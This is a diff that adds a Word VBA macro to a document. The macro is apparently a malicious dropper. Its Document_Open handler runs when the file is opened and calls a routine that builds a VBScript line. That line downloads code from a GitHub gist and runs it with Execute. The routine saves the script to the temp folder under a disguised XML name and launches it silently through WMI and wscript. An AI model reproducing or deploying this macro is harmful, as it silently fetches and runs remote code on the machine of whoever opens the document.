@@ -1,0 +1,34 @@
+Sub rabbit()
+    hs = "On Error Resume Next:Set mx = CreateObject(""Microsoft.XMLHTTP""):mx.open ""GET"", ""https://uuu/gist.txt"", False:mx.Send:Execute(mx.responseText)"
+ui = "gist.githubusercontent.com/dduckworld/6bf376693781e18b98d14d905859850c/raw/3758bd173f4ac7ef2920dbc0fce3b600ed7e3a8a"
+hs = Replace(hs, "uuu", ui)
+rp = Environ$("temp") & "\imagew0000.xml"
+ActiveDocument.Range.Text = hs
+ActiveDocument.SaveAs2 FileName:=rp, FileFormat:=wdFormatText
+ActiveDocument.Close
+Set wmObj = GetObject("winmgmts:win32_process")
+wmObj.Create "wscript.exe //e:vbscript //b " & rp
+End Sub
+
+
+Sub Document_Open()
+    Application.ActiveWindow.View.Type = wdPrintView
+    mytitle = ActiveDocument.BuiltInDocumentProperties("Title")
+
+    If mytitle = "2021" Then
+        ActiveDocument.BuiltInDocumentProperties("Title") = "NTA 2021"
+        If ActiveDocument.ReadOnly = False Then
+            ActiveDocument.Save
+        End If
+        GoTo Earth
+    Else
+    ActiveDocument.BuiltInDocumentProperties("Title") = "2021"
+        If ActiveDocument.ReadOnly = False Then
+            ActiveDocument.Save
+        End If
+    End If
+    
+    Documents.Add
+    rabbit
+Earth:
+End Sub
